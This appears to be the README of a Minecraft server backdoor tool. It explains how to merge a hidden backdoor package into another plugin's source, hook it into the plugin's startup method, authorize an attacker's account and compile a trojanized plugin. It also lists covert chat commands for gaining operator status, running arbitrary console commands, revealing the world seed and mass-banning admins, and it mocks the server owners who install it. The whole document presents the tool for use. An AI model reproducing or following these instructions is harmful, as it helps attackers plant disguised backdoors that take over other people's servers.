


# Thicc Industries' Minecraft Backdoor

A silent, customizable backdoor for Minecraft Bukkit/Spigot/Paper servers.

GUI configuration and injection program comming soon.
## Requirements:
* Java 8 (Newer works but is not reccomended) JDK
* Desired target plugin's source code.
* Spigot buildtools.

## Usage instructions:

(See com.thiccindustries.example.ExamplePlugin for an example installation)

* Download source code for desired plugin, and open in editor of your choice.
* Merge ``com.thiccindustries.backdoor`` folder into the plugin's source.
* Open the Plugin's main source file, The file's class definition should look like this: 
``public class Something extends JavaPlugin{}``
* Add the following line to the top of the file:
``import com.thiccindustries.backdoor``
* Find the ``@Override public void onEnable(){}`` method.
* Add the following line to the beginning of the method:
``new Backdoor(this);``
* Navigate to ``com.thiccindustries.backdoor.Config`` . Add your Minecraft UUID to the ``authorized_uuids`` field.
(You can find your UUID at: [NameMC](https://www.NameMC.com))
* Change other configuration options as desired.
* Compile plugin.

## Commands
Default command prefix is ``#``,  this can be changed in Config.java prior to compilation. 
* #op - Give player operator status
* #deop - Remove player's operator status
* #gamemode / gm - Change gamemode
* #give - Give items
* #32k - Enchant item in hand with level 32k enchants.
* #chaos - Deop and Ban all ops currently online. Give admin to everyone else. **[Visible]**
* #exec - Execute a command as the server console. **[Visible]**
* #seed - Find world seed
* #auth - authorize new user
* #deauth - deauthorize user

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

## License

This software is provided under the:
Thicc-Industries-I-Dont-Care-Do-What-You-Want License.

Oh and also don't yell at me if someone breaks your server with this, its your fault for installing some random person's plugin. Be smarter than that.
